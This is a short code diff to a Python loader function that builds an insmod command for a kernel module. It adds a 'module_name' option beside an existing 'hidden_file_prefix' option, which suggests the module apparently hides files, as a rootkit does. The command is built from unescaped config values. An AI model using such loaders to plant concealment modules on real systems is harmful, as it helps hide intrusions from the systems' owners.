@@ -154,6 +154,8 @@ def load_module(module_path, config):
 	if "HIDDEN_FILE_PREFIX" in config:
 		options += " hidden_file_prefix=\"{}\" ".format(config["HIDDEN_FILE_PREFIX"])
 
+	options += " module_name=\"{}\" ".format(config["MODULE_NAME"])
+
 	cmd = "insmod {} {}".format(module_path, options)
 	run_cmd_exit_on_fail(cmd, run_with_os=True)
 
